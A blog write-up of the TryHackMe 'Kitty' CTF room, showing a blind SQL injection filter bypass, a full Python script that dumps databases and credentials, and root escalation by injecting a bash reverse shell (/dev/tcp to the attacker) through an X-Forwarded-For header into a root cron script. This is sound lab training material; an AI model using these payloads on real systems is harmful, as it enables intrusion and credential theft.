---
title: "Writeup TryHackMe: Kitty \"MediumBox\""
date: 2025-11-28 14:44:00 -0500
categories: [CTF, TryHackMe]
tags: [sql_injection, linux_privilege_escalation, ctf]
image:
  path: /assets/img/kitty/kitty_main.webp
---

**Hello everyone! Hope you're doing great.**

This is my very first write-up on this brand-new blog. I still have a few things to polish here and there, but I really hope you enjoy it and find it helpful.

You can access this room at the following link:

[Kitty Room TryHackMe](https://tryhackme.com/room/kitty){:target="_blank"}

Without further delay… let’s jump right in.

## Active Recon
### Nmap
```bash
$ sudo nmap -sS -sVC -p- --min-rate 5000 10.64.149.216
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 08:44 EST
Nmap scan report for 10.64.149.216 (10.64.149.216)
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f8:36:a9:28:b4:34:59:63:bf:b8:63:a1:a3:fd:b0 (RSA)
|   256 7b:9e:c1:c7:86:0f:ef:5e:f0:5a:11:d1:22:1e:18:9c (ECDSA)
|_  256 48:34:5d:51:63:f8:06:d3:09:5a:72:b0:13:84:22:2e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno }

This machine only has two open ports:
* 80 for HTTP
* 22 for SSH

## Enumerating HTTP Service
Let’s begin by investigating port 80. For that, we’ll run a quick Nikto scan.
### Nikto
```bash
$ nikto -h 10.64.149.216
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.64.149.216
+ Target Hostname:    10.64.149.216
+ Target Port:        80
+ Start Time:         2025-11-28 13:50:35 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-11-28 13:50:45 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
{: .nolineno }

Nothing too interesting here, so let’s access the web interface directly in the browser.

### Login Page
We’re automatically redirected to a login page.

![Login page](/assets/img/kitty/kitty_1.webp)

I tried some classic default credentials like `admin:admin` and `admin:password`, but no luck.
> Fun fact: the "Invalid username or password" message is super generic—thanks, very helpful.
{: .prompt-info }

There’s an option to create a new user, so let’s do that and see what we can access after logging in. I created a user called `test`.

![Creating user](/assets/img/kitty/kitty_2.webp)

After logging in, we get redirected to `/welcome.php` and see this message:

![Welcome page](/assets/img/kitty/kitty_3.webp)

I checked the source code looking for comments, and ran WhatWeb to identify technologies. The only relevant detail was the server version: Apache/2.4.41 (Ubuntu).

## Shell as Kitty

Before looking for vulnerabilities specific to that version, I decided to test some XSS and SQL Injection payloads on the login form.

XSS didn’t work—trust me, I tried for a while.

Next, I moved on to SQL Injection using the classic `' OR 1=1;-- -`. But with a little twist: since we do have a valid user (test), I tried:
```sql
test' OR 1=1;--
```
{: .nolineno }
Plus any random password.

> Warning: Using `' OR 1=1;--` in real environments is never a good idea, especially if the original SQL query modifies data—you might accidentally update every record in the table.
{: .prompt-warning }

This time, something interesting happened. The app returned:

> SQL Injection detected. This incident will be logged!

Looks like we’re on the right track, but something—probably specific characters or patterns—is triggering their regex filter.

To make things easier, I intercepted the request using Burp Suite and moved it to Repeater, then tried different payloads encoded in URL format so characters like quotes and semicolons wouldn’t get blocked.

![Burp Suite](/assets/img/kitty/kitty_4.webp)

After some attempts, I found a payload that worked: `test' AND 1=1;-- -`
![Successful SQL Injection](/assets/img/kitty/kitty_5.webp)

As you can see, when the injection is valid, we get an HTTP 302 Found response. We're dealing with a Blind SQL Injection, specifically Boolean-based.
> Info: Blind SQLi doesn’t display query results directly, so we need to enumerate everything through true/false conditions.
{: .prompt-info }

The general process is:
1. Enumerate database names character by character
2. Enumerate tables within those databases
3. Enumerate each table’s columns
4. Dump the values we need

Doing all this manually would be a nightmare, so I wrote a Python script to automate it.

At first it took quite a while, since it was checking values char by char, so I optimized it using binary search, which sped it up dramatically.

Here’s the script in case you want to take a look:

```python
import requests
import string

URL = "http://10.64.149.216/index.php"
FALSE_INDICATOR = "Invalid username or password"

CHARSET = sorted(
    list(string.ascii_letters + string.digits + "_-{}@!#$%&/()=.")
)

def check_condition(condition):
    payload = f"test' AND ({condition})-- -"
    data = {
        "username": payload,
        "password": "test"
    }

    r = requests.post(URL, data=data)

    return FALSE_INDICATOR not in r.text

def extract_char(query, position):
    low = 0
    high = len(CHARSET) - 1

    while low <= high:
        mid = (low + high) // 2
        mid_char = CHARSET[mid]

        condition = f"ORD(SUBSTRING(({query}),{position},1)) > {ord(mid_char)}"

        if check_condition(condition):
            low = mid + 1
        else:
            high = mid - 1

    if 0 <= low < len(CHARSET):
        final_char = CHARSET[low]
        confirm = f"ORD(SUBSTRING(({query}),{position},1)) = {ord(final_char)}"
        if check_condition(confirm):
            return final_char

    return None  # no encontrado

def extract_string(query, max_len=50):
    result = ""
    for i in range(1, max_len + 1):
        ch = extract_char(query, i)
        if ch is None:
            return result
        result += ch
    return result

def extract_count(query, max_value=100):
    for i in range(0, max_value + 1):
        cond = f"({query})={i}"
        if check_condition(cond):
            return i
    return 0
    
def extract_cell(schema, table, column, row, max_len=100):
    query = f"SELECT {column} FROM {schema}.{table} LIMIT {row},1"
    return extract_string(query, max_len=max_len)

def get_current_database():
    return extract_string("SELECT database()")

def get_databases():
    count = extract_count("SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name != 'information_schema'")
    print(f"[+] Number of databases: {count}")

    dbs = []
    for i in range(count):
        query = f"SELECT schema_name FROM information_schema.schemata WHERE schema_name != 'information_schema' LIMIT {i},1"
        name = extract_string(query)
        print(f"\n[+] Database found: {name}")
        dbs.append(name)
    return dbs


def get_tables(schema):
    query_count = f"""
        SELECT COUNT(*) FROM information_schema.tables
        WHERE table_schema='{schema}'
    """
    count = extract_count(query_count)
    print(f"[+] Tables in {schema}: {count}")

    tables = []
    for i in range(count):
        query = f"""
            SELECT table_name FROM information_schema.tables
            WHERE table_schema='{schema}' LIMIT {i},1
        """
        name = extract_string(query)
        print(f"\n[+] Table found: {name}\n")
        tables.append(name)
    return tables


def get_columns(schema, table):
    query_count = f"""
        SELECT COUNT(*) FROM information_schema.columns
        WHERE table_schema='{schema}' AND table_name='{table}'
    """
    count = extract_count(query_count)
    print(f"[+] Columns in {schema}.{table}: {count}")

    cols = []
    for i in range(count):
        query = f"""
            SELECT column_name FROM information_schema.columns
            WHERE table_schema='{schema}' AND table_name='{table}'
            LIMIT {i},1
        """
        name = extract_string(query)
        print(f"\n Column found: {name}")
        cols.append(name)
    return cols

def get_row_count(schema, table):
    query = f"SELECT COUNT(*) FROM {schema}.{table}"
    count = extract_count(query, max_value=5000)
    print(f"[+] Rows en {schema}.{table}: {count}")
    return count

def dump_table(schema, table):
    print(f"[+] Dumping table {schema}.{table} ...\n")

    columns = get_columns(schema, table)

    row_count = get_row_count(schema, table)

    print("[+] Dump:")
    dump = []

    for row in range(row_count):
        row_data = {}
        print(f"\n[*] Row {row}:")
        for col in columns:
            value = extract_cell(schema, table, col, row)
            row_data[col] = value
            print(f"   - {col}: {value}")
        dump.append(row_data)

    return dump

if __name__ == "__main__":
    print("[*] Enumerating databases..\n")
    dbs = get_databases()
    print()
    
    dbs = ['mywebsite', 'devsite']
    for db in dbs:
        print(f"[*] Enumerating tables in DB {db}...\n")
        tables = get_tables(db)
        print()

    for t in tables:
        print(f"[*] Enumerating columns of {t}...\n")
        get_columns(db, t)
        print()
    
    db = "devsite"
    dump_table(db, "siteusers")
```
{: file="dump_db.py" }

And here’s what the script found:
```
$ python3 dump_db.py
[*] Enumerating databases..

[+] Number of databases: 3

[+] Database found: performance_schema

[+] Database found: mywebsite

[+] Database found: devsite

[*] Enumerating tables in DB mywebsite...

[+] Tables in mywebsite: 1

[+] Table found: siteusers


[*] Enumerating tables in DB devsite...

[+] Tables in devsite: 1

[+] Table found: siteusers


[*] Enumerating columns of siteusers...

[+] Columns in devsite.siteusers: 4

 Column found: created_at

 Column found: id

 Column found: password

 Column found: username

[+] Dumping table devsite.siteusers ...

[+] Columns in devsite.siteusers: 4

 Column found: created_at

 Column found: id

 Column found: password

 Column found: username
[+] Rows en devsite.siteusers: 1
[+] Dump:

[*] Row 0:
   - created_at: 2022-11-15
   - id: 1
   - password: ******
   - username: kitty
```
{: .nolineno }

Looks like we obtained valid credentials for the user `kitty`, so let’s try logging in via SSH.

``` bash
$ ssh kitty@10.64.149.216
Last login: Tue Nov  8 01:59:23 2022 from 10.0.2.26
kitty@ip-10-64-149-216:~$
```
{: .nolineno }

Bingo — we’re in. Kitty’s user flag is in `/home/kitty/user.txt`:

``` bash
$ cat user.txt 
THM{...}
```
{: .nolineno }

## Shell as Root

From the database-dumping script, one database caught my eye: `devsite`.
That suggests there might be a development site not exposed publicly. It could contain credentials or even a privilege-escalation vector.

I checked `/var/www` and found two directories:
* development
* html

Inside `development` there’s an `index.php` file containing some interesting things.

``` php
// SQLMap 
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
  if (preg_match( $evilword, $username )) {
    echo 'SQL Injection detected. This incident will be logged!';
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $ip .= "\n";
    file_put_contents("/var/www/development/logged", $ip);
    die();
  } elseif (preg_match( $evilword, $password )) {
    echo 'SQL Injection detected. This incident will be logged!';
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $ip .= "\n";
    file_put_contents("/var/www/development/logged", $ip);
    die();
  }
}
```
{: .nolineno }

First, we can see the filter that was blocking certain SQL injections.

Second, we see that the request header `HTTP_X_FORWARDED_FOR` gets written to `/var/www/development/logged` whenever an SQL injection is detected.

We don’t have write permissions on that file, so by itself it’s not an escalation vector… yet.

I uploaded `pspy` hoping there might be a cron job or recurring process that interacts with that file, since `/etc/crontab` showed nothing interesting.

Using kitty’s SSH credentials, I copied the file using SCP.

``` bash
$ scp ./pspy64 kitty@10.64.149.216:/tmp
kitty@10.64.149.216's password: 
pspy64
```
{: .nolineno }

After running pspy, I found something very interesting—a script executed by root every minute:

``` bash
$ chmod +x pspy64 
$ ./pspy64
...
2025/11/28 15:41:52 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2025/11/28 15:42:01 CMD: UID=0     PID=2348   | /usr/sbin/CRON -f 
2025/11/28 15:42:01 CMD: UID=0     PID=2349   | 
2025/11/28 15:42:01 CMD: UID=0     PID=2350   | /bin/sh -c /usr/bin/bash /opt/log_checker.sh 
2025/11/28 15:42:01 CMD: UID=0     PID=2351   | cat /dev/null 
2025/11/28 15:43:01 CMD: UID=0     PID=2352   | /usr/sbin/CRON -f 
2025/11/28 15:43:01 CMD: UID=0     PID=2353   | /usr/sbin/CRON -f 
2025/11/28 15:43:01 CMD: UID=0     PID=2354   | /usr/bin/bash /opt/log_checker.sh 
...
```
{: .nolineno }
> It's executed by root because UID=0
{: .prompt-tip }

The file `/opt/log_checker.sh` contains the following:

``` bash
$ cat /opt/log_checker.sh 
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```
{: .nolineno }

This is perfect. The line `/usr/bin/sh -c "echo $ip >> /root/logged"` is vulnerable because `$ip` contains values read from `/var/www/development/logged`, which themselves come from the `HTTP_X_FORWARDED_FOR` header.

So if we inject a command instead of an IP address, we get command execution as root.

While scanning for local ports, I found one listening on 8080.

``` bash
$ ss -tulpn
Netid                    State                     Recv-Q                    Send-Q                                              Local Address:Port                                          Peer Address:Port                    Process                    
udp                      UNCONN                    0                         0                                                   127.0.0.53%lo:53                                                 0.0.0.0:*                                                  
udp                      UNCONN                    0                         0                                              10.64.149.216%eth0:68                                                 0.0.0.0:*                                                  
tcp                      LISTEN                    0                         70                                                      127.0.0.1:33060                                              0.0.0.0:*                                                  
tcp                      LISTEN                    0                         511                                                     127.0.0.1:8080                                               0.0.0.0:*                                                  
tcp                      LISTEN                    0                         128                                                       0.0.0.0:22                                                 0.0.0.0:*                                                  
tcp                      LISTEN                    0                         4096                                                127.0.0.53%lo:53                                                 0.0.0.0:*                                                  
tcp                      LISTEN                    0                         151                                                     127.0.0.1:3306                                               0.0.0.0:*                                                  
tcp                      LISTEN                    0                         128                                                          [::]:22                                                    [::]:*                                                  
tcp                      LISTEN                    0                         511                                                             *:80                                                       *:*                                                  
```
{: .nolineno }

Now all the pieces fit together!!!.

We can make a `curl` request to `localhost` on port 8080, and pass a reverse shell in the `HTTP_X_FORWARDED_FOR` header.

First, we start a netcat listener on our machine:

``` bash
$ nc -lvnp 20123 
listening on [any] 20123 ...
```
{: .nolineno }

Then we send the payload:
``` bash
$ curl http://127.0.0.1:8080/index.php -X POST -d 'username=ifnull&password=pass' -H 'X-Forwarded-For:;bash -c "/bin/bash -i >& /dev/tcp/192.168.145.0/20123 0>&1"'

SQL Injection detected. This incident will be logged!
```
{: .nolineno }

Wait a few seconds… and we get a root shell.
``` bash
$ nc -lvnp 20123                       
listening on [any] 20123 ...
connect to [192.168.145.0] from (UNKNOWN) [10.64.149.216] 60856
bash: cannot set terminal process group (2648): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-64-149-216:~# whoami
whoami
root
```
{: .nolineno }

## Final Thoughts

Thank you so much for reading!
I hope this write-up was helpful (or at least mildly entertaining).

See you in the next one — and as always: Happy Hacking! 🚀🔥